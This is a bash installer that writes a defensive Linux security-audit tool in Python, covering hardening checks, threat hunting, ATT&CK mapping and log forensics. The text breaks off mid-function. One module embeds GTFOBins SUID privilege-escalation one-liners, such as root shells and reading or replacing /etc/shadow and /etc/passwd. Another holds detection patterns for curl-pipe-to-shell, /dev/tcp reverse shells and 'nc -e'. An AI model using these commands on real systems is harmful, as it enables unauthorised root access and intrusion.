#!/usr/bin/env bash
# ==============================================================================
#  AI AYFAM v5 — Complete All-in-One Installer & Upgrader
#  محرك الذكاء المحلي الأقصى للأمن السيبراني — بدون LLM وبدون مفاتيح خارجية
# ==============================================================================

set -e

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}[*] بدء ترقية وتثبيت AI AYFAM v5 (Maximum Intelligence Engine)...${NC}"

# التأكد من وجود المجلدات المطلوبة
mkdir -p engine resources reports ui utils tools brain core config tests scripts

# ==============================================================================
# 1. engine/finding.py
# ==============================================================================
cat << 'EOF' > engine/finding.py
"""
AI AYFAM v5 — Normalized Finding Data Model
نموذج النتائج الموحد — متوافق كلياً مع قواميس dict السابقة، مع دعم وسوم ATT&CK
ودرجات المخاطر وحساب نقاط الاختناق.
"""

import hashlib
import json
from typing import Dict, List, Any, Optional

SEVERITY_WEIGHTS = {
    "critical": 100,
    "high": 70,
    "medium": 40,
    "low": 10,
    "info": 2,
    "safe": 0,
}

class Finding(dict):
    """
    نتيجة فحص أمني مهيكلة وقابلة للاستخدام كـ dict للتوافق مع الإصدارات السابقة.
    """
    def __init__(
        self,
        severity: str,
        title: str,
        detail: str = "",
        fix: str = "",
        category: str = "general",
        tags: Optional[List[str]] = None,
        attack_ids: Optional[List[str]] = None,
        evidence: Optional[Dict[str, Any]] = None,
        fix_cmds: Optional[List[str]] = None,
        effort: str = "medium",       # low, medium, high
        risk_of_fix: str = "low",     # low, medium, high
        confidence: float = 1.0,
        title_en: Optional[str] = None,
        detail_en: Optional[str] = None,
    ):
        sev_clean = (severity or "info").lower()
        if sev_clean not in SEVERITY_WEIGHTS:
            sev_clean = "info"

        # توليد معرف ثابت للنتيجة
        id_material = f"{category}:{title}:{sev_clean}"
        fid = hashlib.sha256(id_material.encode("utf-8")).hexdigest()[:16]

        super().__init__(
            id=fid,
            severity=sev_clean,
            title=title,
            detail=detail,
            fix=fix,
            category=category,
            tags=tags or [],
            attack_ids=attack_ids or [],
            evidence=evidence or {},
            fix_cmds=fix_cmds or ([fix] if fix and "\n" not in fix and not fix.startswith("#") else []),
            effort=effort,
            risk_of_fix=risk_of_fix,
            confidence=confidence,
            title_en=title_en or title,
            detail_en=detail_en or detail,
            score=int(SEVERITY_WEIGHTS.get(sev_clean, 2) * confidence),
        )

    @property
    def id(self) -> str:
        return self["id"]

    @property
    def severity(self) -> str:
        return self["severity"]

    @property
    def title(self) -> str:
        return self["title"]

    @property
    def score(self) -> int:
        return self["score"]

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "Finding":
        return cls(
            severity=d.get("severity", "info"),
            title=d.get("title", ""),
            detail=d.get("detail", ""),
            fix=d.get("fix", ""),
            category=d.get("category", "general"),
            tags=d.get("tags", []),
            attack_ids=d.get("attack_ids", []),
            evidence=d.get("evidence", {}),
            fix_cmds=d.get("fix_cmds", []),
            effort=d.get("effort", "medium"),
            risk_of_fix=d.get("risk_of_fix", "low"),
            confidence=d.get("confidence", 1.0),
            title_en=d.get("title_en"),
            detail_en=d.get("detail_en"),
        )
EOF

# ==============================================================================
# 2. engine/sysreader.py
# ==============================================================================
cat << 'EOF' > engine/sysreader.py
"""
AI AYFAM v5 — System Reader Abstraction
طبقة تجريد قراءة النظام — تتيح الفحص الحقيقي للنظام أو المحاكاة المعزولة (FakeSystem)
للاختبارات بدون الحاجة لصلاحيات Root.
"""

import os
import glob
import re
from typing import Optional, List, Dict, Any, Tuple
from utils import safe_exec

class SystemReader:
    """قارئ النظام الفعلي — يعتمد على safe_exec فقط."""
    def read_text(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                return f.read()
        except Exception:
            return ""

    def exists(self, path: str) -> bool:
        return os.path.exists(path)

    def is_file(self, path: str) -> bool:
        return os.path.isfile(path)

    def is_dir(self, path: str) -> bool:
        return os.path.isdir(path)

    def listdir(self, path: str) -> List[str]:
        try:
            return os.listdir(path)
        except Exception:
            return []

    def glob(self, pattern: str) -> List[str]:
        return glob.glob(pattern)

    def stat(self, path: str) -> Optional[os.stat_result]:
        try:
            return os.stat(path)
        except Exception:
            return None

    def sysctl(self, key: str) -> str:
        path = os.path.join("/proc/sys", key.replace(".", "/"))
        val = self.read_text(path).strip()
        if val:
            return val
        # fallback to command
        res = safe_exec.run(["sysctl", "-n", key], check_binary=False)
        return res.stdout.strip() if res.ok else ""

    def run_cmd(self, args: List[str], timeout: int = 15) -> Tuple[bool, str, str]:
        r = safe_exec.run(args, timeout=timeout, check_binary=False)
        return r.ok, r.stdout, r.stderr


class FakeSystem(SystemReader):
    """نظام وهمي للاختبارات والمحاكاة التامة في الذاكرة."""
    def __init__(self, files: Optional[Dict[str, str]] = None, sysctls: Optional[Dict[str, str]] = None):
        self.files = files or {}
        self.sysctls = sysctls or {}
        self.cmd_responses: Dict[str, Tuple[bool, str, str]] = {}

    def read_text(self, path: str) -> str:
        return self.files.get(path, "")

    def exists(self, path: str) -> bool:
        return path in self.files or any(f.startswith(path.rstrip("/") + "/") for f in self.files)

    def is_file(self, path: str) -> bool:
        return path in self.files

    def is_dir(self, path: str) -> bool:
        p = path.rstrip("/") + "/"
        return any(f.startswith(p) for f in self.files)

    def listdir(self, path: str) -> List[str]:
        p = path.rstrip("/") + "/"
        res = set()
        for f in self.files:
            if f.startswith(p):
                sub = f[len(p):].split("/")[0]
                if sub:
                    res.add(sub)
        return sorted(list(res))

    def glob(self, pattern: str) -> List[str]:
        regex = re.compile("^" + pattern.replace("*", ".*") + "$")
        return [f for f in self.files if regex.match(f)]

    def sysctl(self, key: str) -> str:
        return self.sysctls.get(key, "")

    def set_cmd_response(self, cmd_prefix: str, ok: bool, stdout: str, stderr: str = ""):
        self.cmd_responses[cmd_prefix] = (ok, stdout, stderr)

    def run_cmd(self, args: List[str], timeout: int = 15) -> Tuple[bool, str, str]:
        cmd_str = " ".join(args)
        for prefix, resp in self.cmd_responses.items():
            if cmd_str.startswith(prefix):
                return resp
        return False, "", "command not found in mock"
EOF

# ==============================================================================
# 3. engine/governor.py
# ==============================================================================
cat << 'EOF' > engine/governor.py
"""
AI AYFAM v5 — Resource Governor
حاكم الموارد — يضمن تشغيل الأداة بأقل استهلاك للطاقة والذاكرة، والتكيف التلقائي
مع وضع البطارية على اللابتوب.
"""

import os
import time
from typing import Optional

class ResourceGovernor:
    def __init__(self, sys_reader=None):
        from engine.sysreader import SystemReader
        self.sys = sys_reader or SystemReader()
        self._is_battery = self._detect_battery()

    def _detect_battery(self) -> bool:
        # فحص إمداد الطاقة في Linux sysfs
        power_dir = "/sys/class/power_supply"
        if self.sys.is_dir(power_dir):
            for dev in self.sys.listdir(power_dir):
                type_path = f"{power_dir}/{dev}/type"
                status_path = f"{power_dir}/{dev}/status"
                if "Battery" in self.sys.read_text(type_path):
                    status = self.sys.read_text(status_path).strip().lower()
                    if status in ("discharging",):
                        return True
        return False

    @property
    def is_eco_mode(self) -> bool:
        return self._is_battery

    def get_max_workers(self, requested: int = 20) -> int:
        cpu_cores = os.cpu_count() or 2
        if self.is_eco_mode:
            # تقليل الخيوط إلى النصف في وضع البطارية لتوفير الطاقة
            return max(2, min(requested, cpu_cores))
        return max(4, min(requested, cpu_cores * 4))

    def throttle(self):
        """فواصل زمنية دقيقة عند الفحص الثقيل لتفادي تعليق الجهاز."""
        if self.is_eco_mode:
            time.sleep(0.015)
EOF

# ==============================================================================
# 4. engine/suidintel.py
# ==============================================================================
cat << 'EOF' > engine/suidintel.py
"""
AI AYFAM v5 — GTFOBins & SUID Intelligence Engine
تحليل ذكي لملفات SUID والامتيازات — يربط الملفات التنفيذية بمتجهات كسر الصلاحيات
الحقيقية من مشروع GTFOBins بدون إنترنت.
"""

import os
from typing import List, Dict, Any, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

# قاعدة معرفة محلية مدمجة بأخطر ملفات GTFOBins الشائعة وآليات استغلالها
GTFOBINS_CORE = {
    "bash": {"suid": "bash -p", "desc": "تشغيل شيل فوري بصلاحيات root"},
    "sh": {"suid": "sh -p", "desc": "تشغيل شيل فوري بصلاحيات root"},
    "python": {"suid": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "desc": "تنفيذ كود بايثون كـ root"},
    "python3": {"suid": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "desc": "تنفيذ كود بايثون كـ root"},
    "perl": {"suid": "perl -e 'exec \"/bin/sh\";'", "desc": "تنفيذ كود بيرل كـ root"},
    "ruby": {"suid": "ruby -e 'exec \"/bin/sh\"'", "desc": "تنفيذ كود روبي كـ root"},
    "find": {"suid": "find . -exec /bin/sh -p \\; -quit", "desc": "تنفيذ أوامر عبر وسيط -exec"},
    "vim": {"suid": "vim -c ':!/bin/sh'", "desc": "الهروب من المحرر إلى شيل root"},
    "vi": {"suid": "vi -c ':!/bin/sh'", "desc": "الهروب من المحرر إلى شيل root"},
    "nano": {"suid": "nano (قراءة/تعديل ملفات النظام الحساسة)", "desc": "تعديل /etc/passwd أو /etc/shadow مباشرة"},
    "nmap": {"suid": "nmap --interactive", "desc": "استغلال الوضع التفاعلي القديم لتشغيل أوامر"},
    "awk": {"suid": "awk 'BEGIN {system(\"/bin/sh\")}'", "desc": "تنفيذ دوال النظام في AWK"},
    "gdb": {"suid": "gdb -nx -ex '!sh' -ex quit", "desc": "تشغيل أوامر من داخل مصحح الأخطاء"},
    "cp": {"suid": "cp /etc/shadow /tmp/shadow", "desc": "نسخ وقراءة أي ملف محمي"},
    "mv": {"suid": "mv /tmp/evil_passwd /etc/passwd", "desc": "استبدال ملفات النظام الحساسة"},
    "less": {"suid": "!/bin/sh داخل less", "desc": "الهروب من مستعرض النصوص إلى الشيل"},
    "more": {"suid": "!/bin/sh داخل more", "desc": "الهروب من مستعرض النصوص إلى الشيل"},
    "env": {"suid": "env /bin/sh -p", "desc": "تشغيل بيئة تنفيذ جديدة بصلاحيات كاملة"},
    "tar": {"suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "desc": "تنفيذ أوامر بنقاط الفحص"},
    "zip": {"suid": "zip /tmp/x.zip /etc/shadow", "desc": "ضغط واستخراج الملفات الحساسة"},
    "strace": {"suid": "strace -o /dev/null /bin/sh -p", "desc": "تتبع واستدعاء شيل ذو امتيازات"},
    "pkexec": {"suid": "PwnKit (CVE-2021-4034)", "desc": "ثغرة تصعيد صلاحيات معروفة في Polkit"},
    "date": {"suid": "date -f /etc/shadow", "desc": "قراءة أسطر من ملفات النظام الحساسة"},
    "systemctl": {"suid": "systemctl (خدمة مخصصة)", "desc": "إنشاء خدمة بنمط root وتنفيذها"},
}

class SuidIntelligence:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    def audit_suid(self, suid_paths: List[str]) -> List[Finding]:
        findings = []
        for path in suid_paths:
            binary = os.path.basename(path).lower()
            if binary in GTFOBINS_CORE:
                info = GTFOBINS_CORE[binary]
                findings.append(Finding(
                    severity="critical",
                    title=f"⚠️ ملف SUID عالي الخطورة موثق في GTFOBins: {path}",
                    detail=f"الملف التنفيذي '{binary}' يملك صلاحية SUID ويمكن استغلاله لتصعيد الصلاحيات (Privilege Escalation).\n"
                           f"المتجه: {info['desc']}\nمثال الاستغلال: {info['suid']}",
                    fix=f"sudo chmod u-s {path}",
                    category="privilege_escalation",
                    tags=["suid", "gtfobins", "privesc"],
                    attack_ids=["T1548.001"],
                    effort="low",
                    risk_of_fix="low",
                    confidence=1.0,
                    title_en=f"Critical GTFOBins SUID Binary: {path}",
                    detail_en=f"Binary '{binary}' has SUID bit set and is a known GTFOBins privilege escalation vector.",
                ))
        return findings
EOF

# ==============================================================================
# 5. engine/attack.py
# ==============================================================================
cat << 'EOF' > engine/attack.py
"""
AI AYFAM v5 — MITRE ATT&CK Matrix & Chokepoint Reasoning
ربط النتائج بتكتيكات وتقنيات MITRE ATT&CK، وإجراء تحليل نقاط الاختناق
(Chokepoint Analysis) لتحديد أولويات الإصلاح رياضيّاً (Greedy Set Cover).
"""

from typing import List, Dict, Any, Set
from engine.finding import Finding

# مصفوفة تكتيكات لينكس المدعومة
TACTICS_MAP = {
    "initial-access": "الوصول الأولي / Initial Access",
    "execution": "التنفيذ / Execution",
    "persistence": "الاستمرارية / Persistence",
    "privilege-escalation": "تصعيد الصلاحيات / Privilege Escalation",
    "defense-evasion": "تجاوز الدفاعات / Defense Evasion",
    "credential-access": "سرقة الاعتمادات / Credential Access",
    "discovery": "الاستكشاف / Discovery",
    "lateral-movement": "التحرك الأفقي / Lateral Movement",
    "collection": "جمع البيانات / Collection",
    "impact": "التأثير والتخريب / Impact",
}

class AttackEngine:
    def __init__(self, mitre_dataset: Dict[str, Any] = None):
        self.dataset = mitre_dataset or {}

    def enrich_finding(self, finding: Finding):
        """تعيين تقنيات ATT&CK بناءً على وسوم وفئة النتيجة."""
        tags = set(finding.get("tags", []))
        category = finding.get("category", "")
        attack_ids = set(finding.get("attack_ids", []))

        if "suid" in tags or category == "privilege_escalation":
            attack_ids.add("T1548.001") # Setuid/Setgid
        if "ssh" in tags or "ssh_root_login" in tags:
            attack_ids.add("T1021.004") # SSH
            attack_ids.add("T1078")     # Valid Accounts
        if "cron" in tags:
            attack_ids.add("T1053.003") # Cron
        if "brute_force" in tags:
            attack_ids.add("T1110.001") # Password Guessing
        if "firewall" in tags or "firewall_disabled" in tags:
            attack_ids.add("T1686")     # Impair Defenses: Disable or Modify Firewall
        if "secrets" in tags:
            attack_ids.add("T1552.001") # Credentials in Files
        if "persistence" in tags:
            attack_ids.add("T1547.006") # Kernel Modules / Daemons

        finding["attack_ids"] = sorted(list(attack_ids))

    def chokepoint_analysis(self, findings: List[Finding]) -> List[Dict[str, Any]]:
        """
        تحليل نقاط الاختناق: حساب أي أمر/إجراء إصلاحي يُبطل أكبر عدد من
        تقنيات الهجوم ونتائج الخطورة العالية بأقل مجهود (Greedy Set Cover).
        """
        fix_to_techniques: Dict[str, Set[str]] = {}
        fix_to_findings: Dict[str, List[Finding]] = {}
        fix_details: Dict[str, str] = {}

        for f in findings:
            fix = f.get("fix", "").strip()
            if not fix or fix.startswith("#"):
                continue
            # توحيد السطر الأول من الإصلاح كمفتاح
            primary_cmd = fix.split("\n")[0].strip()
            if primary_cmd not in fix_to_techniques:
                fix_to_techniques[primary_cmd] = set()
                fix_to_findings[primary_cmd] = []
                fix_details[primary_cmd] = fix

            for tid in f.get("attack_ids", []):
                fix_to_techniques[primary_cmd].add(tid)
            fix_to_findings[primary_cmd].append(f)

        ranked = []
        for cmd, techs in fix_to_techniques.items():
            f_list = fix_to_findings[cmd]
            impact_score = sum(f.get("score", 10) for f in f_list)
            ranked.append({
                "fix_cmd": cmd,
                "full_fix": fix_details[cmd],
                "broken_techniques_count": len(techs),
                "mitigated_techniques": sorted(list(techs)),
                "impact_score": impact_score,
                "findings_resolved": len(f_list),
                "resolved_titles": [f.get("title") for f in f_list[:3]],
            })

        # الترتيب حسب كسر أكبر عدد من التقنيات ثم مجموع نقاط الأثر
        ranked.sort(key=lambda x: (x["broken_techniques_count"], x["impact_score"]), reverse=True)
        return ranked
EOF

# ==============================================================================
# 6. engine/hardening.py
# ==============================================================================
cat << 'EOF' > engine/hardening.py
"""
AI AYFAM v5 — CIS Linux Benchmark Hardening Engine
محرك فحص التحصين الشامل — أكثر من 50 فحصاً لمعايير النواة sysctl، إعدادات SSHd،
أذونات الملفات الحساسة، وخيارات الأقراص، وسياسات كلمات المرور.
"""

import os
import stat
from typing import List, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

class HardeningEngine:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    def audit_all(self) -> List[Finding]:
        findings = []
        findings.extend(self.check_kernel_sysctl())
        findings.extend(self.check_file_permissions())
        findings.extend(self.check_mount_options())
        findings.extend(self.check_unnecessary_services())
        findings.extend(self.check_aslr_and_coredumps())
        return findings

    def check_kernel_sysctl(self) -> List[Finding]:
        findings = []
        # فحوصات sysctl الأساسية للأمان الشبكي وحماية النواة
        checks = [
            ("net.ipv4.ip_forward", "0", "high", "توجيه حزم IPv4 مفعل (IP Forwarding)", "sudo sysctl -w net.ipv4.ip_forward=0"),
            ("net.ipv4.conf.all.send_redirects", "0", "medium", "إرسال حزم إعادة توجيه ICMP مفعل", "sudo sysctl -w net.ipv4.conf.all.send_redirects=0"),
            ("net.ipv4.conf.default.send_redirects", "0", "medium", "إرسال حزم إعادة توجيه ICMP الافتراضي مفعل", "sudo sysctl -w net.ipv4.conf.default.send_redirects=0"),
            ("net.ipv4.conf.all.accept_redirects", "0", "medium", "قبول حزم إعادة توجيه ICMP مفعل (عرضة للـ MITM)", "sudo sysctl -w net.ipv4.conf.all.accept_redirects=0"),
            ("net.ipv4.conf.all.rp_filter", "1", "medium", "التحقق من صحة مسار الحزم (Reverse Path Filtering) معطل", "sudo sysctl -w net.ipv4.conf.all.rp_filter=1"),
            ("net.ipv4.tcp_syncookies", "1", "high", "حماية SYN Cookies من هجمات حجب الخدمة (SYN Flood) معطلة", "sudo sysctl -w net.ipv4.tcp_syncookies=1"),
            ("fs.protected_hardlinks", "1", "medium", "حماية الروابط الصلبة (Hardlinks) في النواة معطلة", "sudo sysctl -w fs.protected_hardlinks=1"),
            ("fs.protected_symlinks", "1", "medium", "حماية الروابط الرمزية (Symlinks) في النواة معطلة", "sudo sysctl -w fs.protected_symlinks=1"),
            ("fs.suid_dumpable", "0", "high", "تفريغ ذاكرة عمليات SUID متاح (قد يسرب اعتمادات حساسة)", "sudo sysctl -w fs.suid_dumpable=0"),
        ]

        for key, expected, sev, desc, fix in checks:
            val = self.sys.sysctl(key)
            if val and val != expected:
                findings.append(Finding(
                    severity=sev,
                    title=f"معيار نواة غير محصن: {key} = {val}",
                    detail=f"{desc}. القيمة الموصى بها هي '{expected}'.",
                    fix=f"{fix}\n# للتثبيت الدائم أضف '{key} = {expected}' في /etc/sysctl.d/99-ayfam.conf",
                    category="hardening",
                    tags=["sysctl", "kernel", "hardening"],
                    effort="low",
                    confidence=1.0,
                    title_en=f"Insecure Kernel Sysctl: {key} = {val}",
                    detail_en=f"{desc}. Expected value is '{expected}'.",
                ))
        return findings

    def check_file_permissions(self) -> List[Finding]:
        findings = []
        # فحص صلاحيات ملفات المصادقة الحساسة
        critical_files = [
            ("/etc/shadow", 0o640, "critical", "ملف كلمات المرور المشفرة /etc/shadow يملك صلاحيات مفرطة"),
            ("/etc/gshadow", 0o640, "critical", "ملف مجموعات النظام /etc/gshadow يملك صلاحيات مفرطة"),
            ("/etc/passwd", 0o644, "high", "ملف المستخدمين /etc/passwd قابل للتعديل من غير المصرحين"),
            ("/etc/group", 0o644, "high", "ملف المجموعات /etc/group قابل للتعديل من غير المصرحين"),
        ]

        for path, max_mode, sev, desc in critical_files:
            st = self.sys.stat(path)
            if st:
                mode = stat.S_IMODE(st.st_mode)
                # فحص إن كانت الصلاحيات تمنح الكتابة للآخرين أو القراءة غير المصرح بها
                if (mode & 0o002) != 0 or (path.endswith("shadow") and (mode & 0o004) != 0):
                    findings.append(Finding(
                        severity=sev,
                        title=desc,
                        detail=f"الملف {path} بصلاحيات {oct(mode)} الحالية، متجاوزاً الحد الآمن {oct(max_mode)}.",
                        fix=f"sudo chmod {oct(max_mode)[2:]} {path}",
                        category="file_permissions",
                        tags=["permissions", "auth", "hardening"],
                        attack_ids=["T1552.001", "T1078"],
                        effort="low",
                        confidence=1.0,
                    ))
        return findings

    def check_mount_options(self) -> List[Finding]:
        findings = []
        mounts_content = self.sys.read_text("/proc/mounts")
        if not mounts_content:
            return findings

        # فحص وجود خيارات الحماية (noexec, nosuid, nodev) على مجلدات المشاركة المؤقتة
        for line in mounts_content.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                target = parts[1]
                opts = parts[3].split(",")
                if target in ("/dev/shm", "/run/shm"):
                    missing = [o for o in ("noexec", "nosuid", "nodev") if o not in opts]
                    if missing:
                        findings.append(Finding(
                            severity="medium",
                            title=f"مجلد الذاكرة المشتركة {target} يفتقر لخيارات الحماية: {', '.join(missing)}",
                            detail="عدم وجود noexec/nosuid يتيح للمهاجمين تنفيذ البرمجيات الخبيثة مباشرة من الذاكرة المشتركة.",
                            fix=f"sudo mount -o remount,noexec,nosuid,nodev {target}\n# وحدّث الإعداد في /etc/fstab",
                            category="mount_security",
                            tags=["mount", "hardening"],
                            attack_ids=["T1059.004"],
                        ))
        return findings

    def check_unnecessary_services(self) -> List[Finding]:
        findings = []
        risky_services = ["telnet", "rsh", "rlogin", "nis", "tftp"]
        for srv in risky_services:
            ok, out, _ = self.sys.run_cmd(["systemctl", "is-active", srv])
            if ok and "active" in out:
                findings.append(Finding(
                    severity="high",
                    title=f"خدمة قديمة وغير آمنة قيد التشغيل: {srv}",
                    detail=f"الخدمة {srv} تعتمد على بروتوكولات غير مشفرة أو قديمة وتعتبر خطراً أمنياً داهماً.",
                    fix=f"sudo systemctl stop {srv} && sudo systemctl disable {srv}",
                    category="services",
                    tags=["services", "hardening"],
                    attack_ids=["T1021"],
                ))
        return findings

    def check_aslr_and_coredumps(self) -> List[Finding]:
        findings = []
        aslr = self.sys.sysctl("kernel.randomize_va_space")
        if aslr and aslr != "2":
            findings.append(Finding(
                severity="critical",
                title=f"ميزة عزل الذاكرة العشوائي (ASLR) غير مفعلة بالكامل: {aslr}",
                detail="ASLR يمنع استغلال ثغرات تجاوز سعة المخزن المؤقت (Buffer Overflow). القيمة المطلوبة هي 2.",
                fix="sudo sysctl -w kernel.randomize_va_space=2\n# أضف 'kernel.randomize_va_space = 2' في /etc/sysctl.d/99-ayfam.conf",
                category="memory_protection",
                tags=["aslr", "memory", "exploit_mitigation"],
                attack_ids=["T1068"],
            ))
        return findings
EOF

# ==============================================================================
# 7. engine/hunter.py
# ==============================================================================
cat << 'EOF' > engine/hunter.py
"""
AI AYFAM v5 — Threat Hunter & Persistence Detection
محرك صيد التهديدات المتقدم — يكتشف محاولات الاختراق الخفية، الأبواب الخلفية،
ملفات preload، ومفاتيح SSH الدخيلة، والعمليات التي تعمل من ملفات تنفيذية محذوفة.
"""

import os
import re
from typing import List, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

class ThreatHunter:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    def hunt_all(self) -> List[Finding]:
        findings = []
        findings.extend(self.check_ld_preload())
        findings.extend(self.check_deleted_exe_processes())
        findings.extend(self.check_authorized_keys())
        findings.extend(self.check_shell_profiles())
        findings.extend(self.check_suspicious_cron_scripts())
        return findings

    def check_ld_preload(self) -> List[Finding]:
        findings = []
        preload_file = "/etc/ld.so.preload"
        if self.sys.exists(preload_file):
            content = self.sys.read_text(preload_file).strip()
            if content:
                findings.append(Finding(
                    severity="critical",
                    title="🚨 رصد مكتبة مشتركة محقونة في /etc/ld.so.preload",
                    detail=f"الملف يحتوي على: '{content}'. هذا مؤشر كلاسيكي لـ Userland Rootkit يعترض نداءات النظام.",
                    fix=f"sudo rm -f {preload_file} # وافحص المكتبة المذكورة فوراً",
                    category="persistence",
                    tags=["rootkit", "ld_preload", "stealth"],
                    attack_ids=["T1574.006"],
                    confidence=1.0,
                ))
        return findings

    def check_deleted_exe_processes(self) -> List[Finding]:
        """كشف العمليات التي تعمل حالياً من ملف تنفيذي تم حذفه من القرص."""
        findings = []
        proc_dir = "/proc"
        if not self.sys.is_dir(proc_dir):
            return findings

        for pid in self.sys.listdir(proc_dir):
            if not pid.isdigit() or pid == "1":
                continue
            exe_link = f"/proc/{pid}/exe"
            try:
                # التحقق إن كان الرابط يشير إلى (deleted)
                dest = os.readlink(exe_link) if hasattr(os, "readlink") else ""
                if "(deleted)" in dest:
                    cmdline = self.sys.read_text(f"/proc/{pid}/cmdline").replace("\x00", " ")
                    findings.append(Finding(
                        severity="high",
                        title=f"عملية تعمل من ملف محذوف: PID {pid} ({dest})",
                        detail=f"العملية تستمر بالعمل في الذاكرة بعد حذف ملفها من القرص.\nالأمر: {cmdline[:120]}",
                        fix=f"sudo kill -9 {pid}",
                        category="evasion",
                        tags=["deleted_binary", "in_memory", "malware"],
                        attack_ids=["T1059.004", "T1070.004"],
                    ))
            except Exception:
                continue
        return findings

    def check_authorized_keys(self) -> List[Finding]:
        """فحص مفاتيح SSH المصرح بها وكشف الحقن أو المفاتيح المقيدة المريبة."""
        findings = []
        auth_keys_pattern = "/home/*/.ssh/authorized_keys"
        all_keys = self.sys.glob(auth_keys_pattern) + ["/root/.ssh/authorized_keys"]

        for kfile in all_keys:
            if not self.sys.is_file(kfile):
                continue
            content = self.sys.read_text(kfile)
            for idx, line in enumerate(content.splitlines(), 1):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # كشف الأوامر المحقونة في مفتاح SSH (ForceCommand injection)
                if line.startswith("command=") and any(sh in line for sh in ("sh", "bash", "curl", "nc")):
                    findings.append(Finding(
                        severity="critical",
                        title=f"🚨 أمر إجباري مشبوه داخل مفتاح SSH: {kfile}:{idx}",
                        detail=f"السطر يحتوي على أمر مقيد قد يكون باباً خلفياً: {line[:100]}",
                        fix=f"راجع السطر واحذفه من {kfile}",
                        category="persistence",
                        tags=["ssh_backdoor", "authorized_keys"],
                        attack_ids=["T1098.004"],
                    ))
        return findings

    def check_shell_profiles(self) -> List[Finding]:
        """فحص ملفات تشغيل الطرفية بحثاً عن سكريبتات تحميل تلقائي أو reverse shells."""
        findings = []
        targets = ["/etc/profile", "/etc/bash.bashrc"] + self.sys.glob("/home/*/.bashrc") + self.sys.glob("/home/*/.profile")

        suspicious_patterns = [
            (r"(curl|wget)\s+[^\n|]+\|\s*(sh|bash)", "تحميل وتنفيذ فوري عبر الشيل"),
            (r"/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+", "اتصال عكسي مباشر عبر /dev/tcp"),
            (r"base64\s+-d.*\|.*(sh|bash)", "تنفيذ حمولة مشفرة base64"),
        ]

        for target in targets:
            if not self.sys.is_file(target):
                continue
            text = self.sys.read_text(target)
            for pat, desc in suspicious_patterns:
                if re.search(pat, text):
                    findings.append(Finding(
                        severity="critical",
                        title=f"🚨 نمط باب خلفي في ملف تشغيل الشيل: {target}",
                        detail=f"تم رصد: {desc}",
                        fix=f"افحص الملف {target} فوراً وأزل السطر الخبيث.",
                        category="persistence",
                        tags=["shell_backdoor", "persistence"],
                        attack_ids=["T1546.004"],
                    ))
        return findings

    def check_suspicious_cron_scripts(self) -> List[Finding]:
        findings = []
        cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly"]
        for cdir in cron_dirs:
            if not self.sys.is_dir(cdir):
                continue
            for fname in self.sys.listdir(cdir):
                fpath = os.path.join(cdir, fname)
                if not self.sys.is_file(fpath):
                    continue
                content = self.sys.read_text(fpath)
                if any(x in content for x in ("/tmp/", "/dev/shm", "nc -e", "bash -i")):
                    findings.append(Finding(
                        severity="high",
                        title=f"مهمة مجدولة (Cron) تشغل مسارات مشبوهة: {fpath}",
                        detail=f"السكريبت يشغل ملفات من /tmp أو ينفذ أوامر شبكية غير مألوفة.",
                        fix=f"راجع محتوى {fpath} وتأكد من شرعيته.",
                        category="persistence",
                        tags=["cron", "persistence"],
                        attack_ids=["T1053.003"],
                    ))
        return findings
EOF

# ==============================================================================
# 8. engine/logforensics.py
# ==============================================================================
cat << 'EOF' > engine/logforensics.py
"""
AI AYFAM v5 — Advanced Log Forensics Engine
تحليل جنائي متقدم للسجلات — كشف الهجمات الموزعة، Password Spraying،
والمؤشر الحرج لنجاح الاختراق: دخول ناجح بعد إخفاقات متكررة.
"""

import re
from collections import defaultdict
from typing import List, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

class LogForensicsEngine:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    def analyze_auth_logs(self) -> List[Finding]:
        findings = []
        log_files = ["/var/log/auth.log", "/var/log/auth.log.1"]
        content = ""
        for lf in log_files:
            if self.sys.is_file(lf):
                content += self.sys.read_text(lf) + "\n"

        if not content.strip():
            # إذا تعذر قراءة الملفات مباشرة، جرب سحبها عبر journalctl
            ok, out, _ = self.sys.run_cmd(["journalctl", "-u", "ssh", "-n", "3000", "--no-pager"])
            if ok:
                content = out

        if not content.strip():
            return findings

        # 1. تتبع المحاولات الفاشلة لكل IP ولكل مستخدم
        failed_by_ip = defaultdict(int)
        failed_by_user = defaultdict(set) # user -> set of IPs
        successful_logins = set()          # IPs that succeeded
        ip_timeline = defaultdict(list)    # ip -> list of ('fail'/'success', user)

        fail_pattern = re.compile(r"Failed password for (?:invalid user )?(\S+) from (\d+\.\d+\.\d+\.\d+)")
        succ_pattern = re.compile(r"Accepted (?:password|publickey) for (\S+) from (\d+\.\d+\.\d+\.\d+)")

        for line in content.splitlines():
            m_fail = fail_pattern.search(line)
            if m_fail:
                user, ip = m_fail.group(1), m_fail.group(2)
                failed_by_ip[ip] += 1
                failed_by_user[user].add(ip)
                ip_timeline[ip].append(('fail', user))

            m_succ = succ_pattern.search(line)
            if m_succ:
                user, ip = m_succ.group(1), m_succ.group(2)
                successful_logins.add(ip)
                ip_timeline[ip].append(('success', user))

        # 2. مؤشر الاختراق الحرج: نجاح تسجيل الدخول بعد إخفاقات متعددة من نفس الـ IP
        for ip, events in ip_timeline.items():
            fails_before_success = 0
            for ev_type, user in events:
                if ev_type == 'fail':
                    fails_before_success += 1
                elif ev_type == 'success' and fails_before_success >= 4:
                    findings.append(Finding(
                        severity="critical",
